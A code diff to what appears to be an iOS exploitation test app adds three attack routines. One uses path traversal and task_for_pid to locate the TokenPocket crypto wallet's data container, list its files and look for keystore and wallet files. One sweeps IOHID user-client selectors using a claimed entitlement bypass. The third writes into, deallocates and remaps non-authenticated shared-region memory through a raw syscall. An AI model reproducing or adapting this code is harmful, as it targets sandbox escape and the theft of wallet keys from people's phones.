@@ -320,6 +320,9 @@ static const char kOpenPropertiesGarbage[] =
 @property (nonatomic, strong) UIButton   *ipcKmsgButton;
 @property (nonatomic, strong) UIButton   *sysvSemButton;
 @property (nonatomic, strong) UIButton   *aksProbeButton;
+@property (nonatomic, strong) UIButton   *tpWalletButton;
+@property (nonatomic, strong) UIButton   *iohidDeepButton;
+@property (nonatomic, strong) UIButton   *rieNonauthButton;
 @property (nonatomic, strong) UIButton   *rieProbeButton;
 @property (nonatomic, strong) UITextView *logView;
 @property (nonatomic, assign) int  proofCrossClientEvents;
@@ -940,6 +943,33 @@ static void *e2_free_and_ool_racer(void *arg) {
     [self.aksProbeButton addTarget:self action:@selector(aksProbeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.aksProbeButton];
 
+    self.tpWalletButton = [UIButton buttonWithType:UIButtonTypeSystem];
+    self.tpWalletButton.translatesAutoresizingMaskIntoConstraints = NO;
+    UIButtonConfiguration *tpConf = [UIButtonConfiguration filledButtonConfiguration];
+    tpConf.baseBackgroundColor = [UIColor systemYellowColor];
+    self.tpWalletButton.configuration = tpConf;
+    [self.tpWalletButton setTitle:@"TP Wallet Direct (v1)" forState:UIControlStateNormal];
+    [self.tpWalletButton addTarget:self action:@selector(tpWalletTapped) forControlEvents:UIControlEventTouchUpInside];
+    [self.view addSubview:self.tpWalletButton];
+
+    self.iohidDeepButton = [UIButton buttonWithType:UIButtonTypeSystem];
+    self.iohidDeepButton.translatesAutoresizingMaskIntoConstraints = NO;
+    UIButtonConfiguration *iodConf = [UIButtonConfiguration filledButtonConfiguration];
+    iodConf.baseBackgroundColor = [UIColor systemBrownColor];
+    self.iohidDeepButton.configuration = iodConf;
+    [self.iohidDeepButton setTitle:@"IOHID Deep Probe (v1)" forState:UIControlStateNormal];
+    [self.iohidDeepButton addTarget:self action:@selector(iohidDeepTapped) forControlEvents:UIControlEventTouchUpInside];
+    [self.view addSubview:self.iohidDeepButton];
+
+    self.rieNonauthButton = [UIButton buttonWithType:UIButtonTypeSystem];
+    self.rieNonauthButton.translatesAutoresizingMaskIntoConstraints = NO;
+    UIButtonConfiguration *rnaConf = [UIButtonConfiguration filledButtonConfiguration];
+    rnaConf.baseBackgroundColor = [UIColor systemRedColor];
+    self.rieNonauthButton.configuration = rnaConf;
+    [self.rieNonauthButton setTitle:@"Rie NONAUTH Carrier (v1)" forState:UIControlStateNormal];
+    [self.rieNonauthButton addTarget:self action:@selector(rieNonauthTapped) forControlEvents:UIControlEventTouchUpInside];
+    [self.view addSubview:self.rieNonauthButton];
+
     self.rieProbeButton = [UIButton buttonWithType:UIButtonTypeSystem];
     self.rieProbeButton.translatesAutoresizingMaskIntoConstraints = NO;
     UIButtonConfiguration *rieConf = [UIButtonConfiguration filledButtonConfiguration];
@@ -995,7 +1025,16 @@ static void *e2_free_and_ool_racer(void *arg) {
         [self.aksProbeButton.topAnchor constraintEqualToAnchor:self.sysvSemButton.bottomAnchor constant:12],
         [self.aksProbeButton.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
         [self.aksProbeButton.widthAnchor constraintGreaterThanOrEqualToConstant:220],
-        [self.rieProbeButton.topAnchor constraintEqualToAnchor:self.aksProbeButton.bottomAnchor constant:12],
+        [self.tpWalletButton.topAnchor constraintEqualToAnchor:self.aksProbeButton.bottomAnchor constant:12],
+        [self.tpWalletButton.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
+        [self.tpWalletButton.widthAnchor constraintGreaterThanOrEqualToConstant:220],
+        [self.iohidDeepButton.topAnchor constraintEqualToAnchor:self.tpWalletButton.bottomAnchor constant:12],
+        [self.iohidDeepButton.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
+        [self.iohidDeepButton.widthAnchor constraintGreaterThanOrEqualToConstant:220],
+        [self.rieNonauthButton.topAnchor constraintEqualToAnchor:self.iohidDeepButton.bottomAnchor constant:12],
+        [self.rieNonauthButton.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
+        [self.rieNonauthButton.widthAnchor constraintGreaterThanOrEqualToConstant:220],
+        [self.rieProbeButton.topAnchor constraintEqualToAnchor:self.rieNonauthButton.bottomAnchor constant:12],
         [self.rieProbeButton.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
         [self.rieProbeButton.widthAnchor constraintGreaterThanOrEqualToConstant:220],
         [self.logView.topAnchor constraintEqualToAnchor:self.rieProbeButton.bottomAnchor constant:20],
@@ -10529,6 +10568,384 @@ static uint64_t rie_find_exec_base(task_t task,
         }
 
         [self appendLog:@"=== Rie probe done ==="];
+    });
+}
+
+// ── TP Wallet Direct (v1) — direct TokenPocket sandbox/process probe ──
+- (void)tpWalletTapped {
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        [self appendLog:@"\n========== TP Wallet Direct v1 =========="];
+        NSString *p24 = @"../../../../../../../../../../../../..";
+        NSFileManager *fm = [NSFileManager defaultManager];
+
+        // -- Phase 1: find TP's data container --
+        [self appendLog:@"── Phase 1: TP container search ──"];
+        NSArray *tpBundleCandidates = @[
+            @"com.tokenpocket.tokenpocket",
+            @"com.tptokenpocket.tokenpocket",
+            @"org.tokenpocket.wallet",
+            @"io.tokenpocket.TokenPocket",
+            @"com.tokenpokcet.tokenpocket",
+        ];
+        NSString *appRoot = [p24 stringByAppendingString:@"var/mobile/Containers/Data/Application"];
+        NSString *appRootResolved = [appRoot stringByExpandingTildeInPath];
+        NSArray *appDirs = [fm contentsOfDirectoryAtPath:appRootResolved error:nil];
+        [self appendLog:[NSString stringWithFormat:@"  app containers: %lu dirs", (unsigned long)appDirs.count]];
+
+        for (NSString *uuid in appDirs) {
+            if (uuid.length < 10) continue;
+            // Read .com.apple.mobile_container_manager.metadata.plist
+            NSString *metaPath = [NSString stringWithFormat:@"%@/%@/.com.apple.mobile_container_manager.metadata.plist",
+                appRootResolved, uuid];
+            NSDictionary *meta = [NSDictionary dictionaryWithContentsOfFile:metaPath];
+            NSString *bundleId = meta[@"MCMMetadataIdentifier"];
+            if (bundleId) {
+                for (NSString *cand in tpBundleCandidates) {
+                    if ([bundleId rangeOfString:cand options:NSCaseInsensitiveSearch].location != NSNotFound) {
+                        [self appendLog:[NSString stringWithFormat:@"  *** FOUND TP: %@ → %@/%@ ***",
+                            bundleId, appRootResolved, uuid]];
+                        // Try to list its Documents
+                        NSString *docsPath = [NSString stringWithFormat:@"%@/%@/Documents", appRootResolved, uuid];
+                        NSArray *docs = [fm contentsOfDirectoryAtPath:docsPath error:nil];
+                        [self appendLog:[NSString stringWithFormat:@"    Documents: %lu files", (unsigned long)docs.count]];
+                        for (NSString *f in docs) {
+                            [self appendLog:[NSString stringWithFormat:@"      %@", f]];
+                        }
+                        // Look for wallet data files
+                        NSArray *knownWallets = @[@"wallet", @"keystore", @"keyinfo", @"wallet_data", @"wallet.json", @"wallets", @"data"];
+                        for (NSString *wf in knownWallets) {
+                            NSString *wfPath = [NSString stringWithFormat:@"%@/%@/%@", appRootResolved, uuid, wf];
+                            BOOL isDir = NO;
+                            if ([fm fileExistsAtPath:wfPath isDirectory:&isDir]) {
+                                [self appendLog:[NSString stringWithFormat:@"    wallet path exists: %@ (dir=%d)", wf, isDir]];
+                            }
+                            // also check Library/
+                            NSString *libPath = [NSString stringWithFormat:@"%@/%@/Library/%@", appRootResolved, uuid, wf];
+                            if ([fm fileExistsAtPath:libPath isDirectory:&isDir]) {
+                                [self appendLog:[NSString stringWithFormat:@"    wallet path exists: Library/%@ (dir=%d)", wf, isDir]];
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
+        // -- Phase 2: check for running TP process --
+        [self appendLog:@"── Phase 2: TP process check ──"];
+        int mib[] = {CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0};
+        size_t len = 0;
+        sysctl(mib, 4, NULL, &len, NULL, 0);
+        struct kinfo_proc *procs = (struct kinfo_proc *)malloc(len);
+        if (procs && sysctl(mib, 4, procs, &len, NULL, 0) == 0) {
+            int count = (int)(len / sizeof(struct kinfo_proc));
+            for (int i = 0; i < count; i++) {
+                NSString *pName = [NSString stringWithUTF8String:procs[i].kp_proc.p_comm];
+                if ([pName rangeOfString:@"token" options:NSCaseInsensitiveSearch].location != NSNotFound ||
+                    [pName rangeOfString:@"pocket" options:NSCaseInsensitiveSearch].location != NSNotFound ||
+                    [pName rangeOfString:@"tp" options:NSCaseInsensitiveSearch].location != NSNotFound) {
+                    pid_t pid = procs[i].kp_proc.p_pid;
+                    [self appendLog:[NSString stringWithFormat:@"  TP-RELATED PROCESS: %@ pid=%d", pName, pid]];
+                    // Try task_for_pid (will likely fail without entitlement)
+                    task_t tpTask = MACH_PORT_NULL;
+                    kern_return_t kr = task_for_pid(mach_task_self(), pid, &tpTask);
+                    [self appendLog:[NSString stringWithFormat:@"    task_for_pid: kr=%d (0=ok)", kr]];
+                    if (kr == KERN_SUCCESS && tpTask != MACH_PORT_NULL) {
+                        [self appendLog:@"    *** GOT TASK PORT — can read TP memory! ***"];
+                        mach_port_deallocate(mach_task_self(), tpTask);
+                    }
+                }
+            }
+        }
+        free(procs);
+
+        // -- Phase 3: URL scheme probe --
+        [self appendLog:@"── Phase 3: URL scheme probe ──"];
+        NSArray *urlSchemes = @[@"tokenpocket://", @"tp://", @"tpocket://", @"tokenpocketpro://"];
+        for (NSString *scheme in urlSchemes) {
+            NSURL *url = [NSURL URLWithString:scheme];
+            if ([[UIApplication sharedApplication] canOpenURL:url]) {
+                [self appendLog:[NSString stringWithFormat:@"  CAN open: %@", scheme]];
+            } else {
+                [self appendLog:[NSString stringWithFormat:@"  cannot open: %@", scheme]];
+            }
+        }
+
+        [self appendLog:@"========== TP Wallet Direct v1 Done =========="];
+    });
+}
+
+// ── IOHID Deep Probe (v1) — enumerate all IOHIDFamily services ──
+- (void)iohidDeepTapped {
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        [self appendLog:@"\n========== IOHID Deep Probe v1 =========="];
+        NSMutableString *log = [NSMutableString string];
+
+        // -- Enumerate all IOHIDFamily services --
+        [log appendString:@"\n── Phase 1: IOHIDFamily service enumeration ──\n"];
+        CFMutableDictionaryRef matchAll = IOServiceMatching("IOHIDFamily");
+        io_iterator_t iter = IO_OBJECT_NULL;
+        kern_return_t kr = IOServiceGetMatchingServices(kIOMainPortDefault, matchAll, &iter);
+        if (kr != KERN_SUCCESS) {
+            [log appendFormat:@"IOServiceGetMatchingServices(IOHIDFamily) failed: 0x%x\n", kr];
+            [self appendLog:log]; return;
+        }
+
+        io_object_t svc;
+        int svcIdx = 0;
+        while ((svc = IOIteratorNext(iter)) != IO_OBJECT_NULL) {
+            io_name_t sname;
+            IORegistryEntryGetName(svc, sname);
+            [log appendFormat:@"[%d] IOHIDFamily svc: %s\n", svcIdx++, sname];
+            IOObjectRelease(svc);
+        }
+        IOObjectRelease(iter);
+
+        // -- Enumerate IOHIDEventService subclasses --
+        [log appendString:@"\n── Phase 2: IOHIDEventService subclasses ──\n"];
+        CFMutableDictionaryRef matchES = IOServiceMatching("IOHIDEventService");
+        io_iterator_t esIter = IO_OBJECT_NULL;
+        kr = IOServiceGetMatchingServices(kIOMainPortDefault, matchES, &esIter);
+        if (kr == KERN_SUCCESS) {
+            io_object_t es;
+            int esIdx = 0;
+            while ((es = IOIteratorNext(esIter)) != IO_OBJECT_NULL && esIdx < 20) {
+                io_name_t esname;
+                IORegistryEntryGetName(es, esname);
+                [log appendFormat:@"[%d] IOHIDEventService: %s\n", esIdx++, esname];
+
+                // Try to open UserClient
+                io_connect_t conn = IO_OBJECT_NULL;
+                kr = IOServiceOpen(es, mach_task_self(), 0, &conn); // type 0 = default
+                if (kr == KERN_SUCCESS && conn != IO_OBJECT_NULL) {
+                    [log appendFormat:@"  IOServiceOpen type=0 OK, conn=%d\n", conn];
+                    // Probe external methods
+                    for (int sel = 0; sel < 32; sel++) {
+                        char out[256] = {0};
+                        size_t outSz = sizeof(out);
+                        kr = IOConnectCallMethod(conn, sel, NULL, 0, NULL, 0,
+                            NULL, NULL, out, &outSz);
+                        if (kr != KERN_SUCCESS && kr != 0xE00002C2) { // not all are valid
+                            // Only log non-trivial results
+                        }
+                        if (kr == 0) {
+                            [log appendFormat:@"    sel%d: kr=0 outSz=%zu\n", sel, outSz];
+                        }
+                    }
+                    IOServiceClose(conn);
+                } else {
+                    [log appendFormat:@"  IOServiceOpen type=0 failed: 0x%x\n", kr];
+                }
+                IOObjectRelease(es);
+            }
+            IOObjectRelease(esIter);
+        }
+
+        // -- Try specific IOHIDEventServiceUserClient types --
+        [log appendString:@"\n── Phase 3: UserClient type scan ──\n"];
+        CFMutableDictionaryRef matchUC = IOServiceMatching("IOHIDEventServiceUserClient");
+        io_iterator_t ucIter = IO_OBJECT_NULL;
+        kr = IOServiceGetMatchingServices(kIOMainPortDefault, matchUC, &ucIter);
+        if (kr == KERN_SUCCESS) {
+            io_object_t uc;
+            int ucIdx = 0;
+            while ((uc = IOIteratorNext(ucIter)) != IO_OBJECT_NULL && ucIdx < 10) {
+                io_name_t ucname;
+                IORegistryEntryGetName(uc, ucname);
+                [log appendFormat:@"[%d] IOHIDEventServiceUserClient: %s\n", ucIdx++, ucname];
+                IOObjectRelease(uc);
+            }
+            IOObjectRelease(ucIter);
+        }
+
+        // -- Try FastPathUserClient with different args (beyond 28992 PoC) --
+        [log appendString:@"\n── Phase 4: FastPathUserClient sel scan ──\n"];
+        CFMutableDictionaryRef matchFP = IOServiceMatching("IOHIDEventServiceFastPathUserClient");
+        io_iterator_t fpIter = IO_OBJECT_NULL;
+        kr = IOServiceGetMatchingServices(kIOMainPortDefault, matchFP, &fpIter);
+        if (kr == KERN_SUCCESS) {
+            io_object_t fpSvc;
+            int fpIdx = 0;
+            while ((fpSvc = IOIteratorNext(fpIter)) != IO_OBJECT_NULL && fpIdx < 5) {
+                io_name_t fpName;
+                IORegistryEntryGetName(fpSvc, fpName);
+                [log appendFormat:@"[%d] FastPathUserClient: %s\n", fpIdx++, fpName];
+
+                // Try opening with entitlement bypass (already known: put keys in input dict)
+                for (int ucType = 0; ucType < 8; ucType++) {
+                    io_connect_t fpc = IO_OBJECT_NULL;
+                    kr = IOServiceOpen(fpSvc, mach_task_self(), ucType, &fpc);
+                    if (kr == KERN_SUCCESS && fpc != IO_OBJECT_NULL) {
+                        [log appendFormat:@"  IOServiceOpen type=%d OK conn=%d\n", ucType, fpc];
+                        // Probe selectors 0-15 with different input params
+                        for (int sel = 0; sel < 16; sel++) {
+                            uint64_t inScalar[8] = {0};
+                            uint32_t inCnt = 1;
+                            uint64_t outScalar[8] = {0};
+                            size_t outCnt = 1;
+                            kr = IOConnectCallMethod(fpc, sel,
+                                inScalar, inCnt, NULL, 0,
+                                outScalar, &outCnt, NULL, NULL);
+                            if (kr == 0) {
+                                [log appendFormat:@"    sel%d: OK out[0]=0x%llx\n", sel, outScalar[0]];
+                            }
+                        }
+                        IOServiceClose(fpc);
+                    }
+                }
+                IOObjectRelease(fpSvc);
+            }
+            IOObjectRelease(fpIter);
+        }
+
+        [self appendLog:log];
+        [self appendLog:@"========== IOHID Deep Probe v1 Done =========="];
+    });
+}
+
+// ── Rie NONAUTH Carrier (v1) — manipulate NONAUTH RW slide carriers ──
+- (void)rieNonauthTapped {
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        [self appendLog:@"\n========== Rie NONAUTH Carrier v1 =========="];
+        [self appendLog:@"── Target: NONAUTH RW regions in shared region ──"];
+
+        // From Phase E: three NONAUTH carriers in RW regions
+        // MWS[1] a=0x1e6710000 sz=0x1e48000 sl=0xf3c fl=0x4 p=3/1  NONAUTH
+        // MWS[2] a=0x1ea558000 sz=0x2e70000 sl=0x1750 fl=0x0 p=3/3  NONAUTH
+        // MWS[3] a=0x1ed3c8000 sz=0x24000 sl=0x2a fl=0x44 p=3/1   (has AUTH+data bits)
+        // fl=0x4: version=4 (v3), no AUTH. fl=0x0: version=0, no AUTH.
+
+        // Re-scan to find current NONAUTH regions
+        void *vmrr = dlsym(RTLD_DEFAULT, "mach_vm_region_recurse");
+        void *vmro = dlsym(RTLD_DEFAULT, "mach_vm_read_overwrite");
+        void *vmw = dlsym(RTLD_DEFAULT, "mach_vm_write");
+        if (!vmrr || !vmro || !vmw) {
+            [self appendLog:@"!! missing vm_* functions"];
+            return;
+        }
+
+        typedef kern_return_t (*VRRFn)(vm_map_t, mach_vm_address_t*, mach_vm_size_t*,
+            natural_t*, vm_region_recurse_info_t, mach_msg_type_number_t*);
+        typedef kern_return_t (*VROFn)(vm_map_t, mach_vm_address_t, mach_vm_size_t,
+            mach_vm_address_t, mach_vm_size_t*);
+        typedef kern_return_t (*VWFn)(vm_map_t, mach_vm_address_t, vm_offset_t, mach_msg_type_number_t);
+        VRRFn vrr = (VRRFn)vmrr;
+        VROFn vro = (VROFn)vmro;
+        VWFn vm_write = (VWFn)vmw;
+
+        #define RNA_SR_BASE 0x180000000ULL
+        #define RNA_SR_LIMIT (RNA_SR_BASE + 0x84000000ULL)
+
+        mach_vm_address_t walk = RNA_SR_BASE;
+        mach_vm_size_t segSize = 0;
+        natural_t segDepth = 1;
+        int segIdx = 0, nonauthFound = 0;
+        NSMutableString *log = [NSMutableString string];
+
+        for (; segIdx < 80; segIdx++) {
+            vm_region_recurse_info_t info;
+            memset(info, 0, sizeof(info));
+            mach_msg_type_number_t cnt = sizeof(info)/sizeof(natural_t);
+            if (vrr(mach_task_self(), &walk, &segSize, &segDepth, info, &cnt) != KERN_SUCCESS) break;
+            if (walk >= RNA_SR_LIMIT) break;
+            if (segSize < 0x4000) { walk += segSize; continue; }
+
+            uint8_t buf[4096];
+            mach_vm_size_t outSz = 0;
+            if (vro(mach_task_self(), walk, 4096, (mach_vm_address_t)(uintptr_t)buf, &outSz) != KERN_SUCCESS) {
+                walk += segSize; continue;
+            }
+            if (memcmp(buf, "dyld_v1", 7) != 0) { walk += segSize; continue; }
+
+            uint32_t mws_off = *(uint32_t*)(buf + 0x138);
+            uint32_t mws_cnt = *(uint32_t*)(buf + 0x13c);
+            if (mws_cnt == 0 || mws_cnt > 64) { walk += segSize; continue; }
+
+            // Read full header
+            uint8_t fbuf[0x10000];
+            mach_vm_size_t fsz = 0;
+            if (vro(mach_task_self(), walk, sizeof(fbuf), (mach_vm_address_t)(uintptr_t)fbuf, &fsz) != KERN_SUCCESS) {
+                walk += segSize; continue;
+            }
+
+            for (uint32_t mi = 0; mi < mws_cnt && nonauthFound < 10; mi++) {
+                uint8_t *mws = fbuf + mws_off + mi * 32;
+                uint64_t mAddr = *(uint64_t*)(mws + 0);
+                uint64_t mSize = *(uint64_t*)(mws + 8);
+                uint64_t mFoff = *(uint64_t*)(mws + 16);
+                uint32_t mFl = *(uint32_t*)(mws + 24);
+                uint32_t mMax = *(uint32_t*)(mws + 28);
+                uint32_t mInit = *(uint32_t*)(mws + 30);
+
+                BOOL isNA = ((mFl & 0x40) == 0); // non-auth
+                BOOL isRW = (mMax == 3 || mInit == 3);
+                if (!isNA || !isRW || mSize < 0x1000) continue;
+
+                nonauthFound++;
+                [log appendFormat:@"\nNONAUTH[%d]: a=0x%llx sz=0x%llx fl=0x%x p=%d/%d",
+                    nonauthFound, mAddr, mSize, mFl, mMax, mInit];
+
+                // Try to read current content at the carrier address
+                uint8_t cb[256];
+                mach_vm_size_t csz = 0;
+                if (vro(mach_task_self(), mAddr, sizeof(cb), (mach_vm_address_t)(uintptr_t)cb, &csz) == KERN_SUCCESS) {
+                    [log appendFormat:@"\n  read OK at 0x%llx: %02x%02x%02x%02x...",
+                        mAddr, cb[0],cb[1],cb[2],cb[3]];
+                }
+
+                // Try to write a marker to see if RW works
+                if (mMax == 3) {
+                    uint8_t marker[8] = {0xAA,0xBB,0xCC,0xDD,0xEE,0xFF,0x00,0x11};
+                    kr = vm_write(mach_task_self(), mAddr, (vm_offset_t)marker, 8);
+                    [log appendFormat:@"\n  vm_write: kr=%d (0=ok)", kr];
+                    if (kr == KERN_SUCCESS) {
+                        // Read back to verify
+                        uint8_t vb[8];
+                        mach_vm_size_t vsz = 0;
+                        if (vro(mach_task_self(), mAddr, 8, (mach_vm_address_t)(uintptr_t)vb, &vsz) == KERN_SUCCESS) {
+                            [log appendFormat:@" verify: %02x%02x%02x%02x%02x%02x%02x%02x",
+                                vb[0],vb[1],vb[2],vb[3],vb[4],vb[5],vb[6],vb[7]];
+                        }
+                    }
+                }
+
+                // Try to deallocate this sub-region to see what happens
+                kr = vm_deallocate(mach_task_self(), mAddr, mSize);
+                [log appendFormat:@"\n  vm_deallocate: kr=%d (0=ok)", kr];
+
+                // Re-read after dealloc
+                if (kr == KERN_SUCCESS) {
+                    uint8_t aft[32];
+                    mach_vm_size_t asz = 0;
+                    kern_return_t kr2 = vro(mach_task_self(), mAddr, sizeof(aft),
+                        (mach_vm_address_t)(uintptr_t)aft, &asz);
+                    [log appendFormat:@"\n  after dealloc read: kr=%d", kr2];
+                    if (kr2 == KERN_SUCCESS) {
+                        [log appendFormat:@" data: %02x%02x%02x%02x...", aft[0],aft[1],aft[2],aft[3]];
+                    }
+
+                    // Now try to re-map using syscall 536 with nf=0 (in-memory only)
+                    long (*sc)(int, ...) = dlsym(RTLD_DEFAULT, "syscall");
+                    if (sc) {
+                        struct {
+                            uint64_t addr, size, foff, slide_size, slide_start;
+                            uint32_t max_prot, init_prot;
+                        } rm = {mAddr, mSize, 0, 0, 0, mMax, mInit};
+
+                        long r = sc(536, 0, NULL, 1, &rm);
+                        [log appendFormat:@"\n  sc(536,nf=0,nm=1): ret=%ld errno=%d", r, errno];
+                    }
+                }
+            }
+            walk += segSize;
+        }
+
+        [log appendFormat:@"\n  total NONAUTH RW regions: %d", nonauthFound];
+        if (nonauthFound == 0) {
+            [log appendString:@"\n  No NONAUTH regions found — scanning all dyld headers..."];
+        }
+
+        [self appendLog:log];
+        [self appendLog:@"========== Rie NONAUTH Carrier v1 Done =========="];
     });
 }
 
